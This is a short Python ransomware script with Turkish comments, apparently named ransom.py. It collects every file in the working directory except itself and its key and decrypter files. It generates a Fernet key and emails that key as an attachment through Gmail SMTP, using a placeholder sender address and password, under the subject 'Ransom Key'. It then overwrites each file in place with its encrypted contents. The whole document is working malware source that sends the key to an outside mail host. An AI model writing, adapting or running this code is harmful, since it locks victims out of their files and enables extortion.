import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from cryptography.fernet import Fernet

def send_email(subject, body, to_address, attachment_data=None):
    from_address = 'your_email@gmail.com'  # Kendi e-posta adresinizi girin
    password = 'your_email_password'  # E-posta şifrenizi girin

    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = subject

    # E-posta gövdesi
    msg.attach(MIMEText(body, 'plain'))

    # E-posta eki
    if attachment_data:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment_data)
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename=generatedkey.key')
        msg.attach(part)

    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(from_address, password)
        server.sendmail(from_address, to_address, msg.as_string())

# Dosya isimlerini toplamak için kullanılan kodu buraya ekleyin
files = []
for file in os.listdir():
    if file == "ransom.py" or file == "generatedkey.key" or file == "ransomdecrypter.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# Anahtarı oluştur
key = Fernet.generate_key()

# Anahtarı e-posta ile gönder
send_email(subject='Fidye Anahtarı', body='Fidye anahtarı bulunmaktadır.', to_address='your_email@gmail.com', attachment_data=key)

# Dosyaları şifrele
for file in files:
    with open(file, "rb") as the_file:
        contents = the_file.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as the_file:
        the_file.write(contents_encrypted)
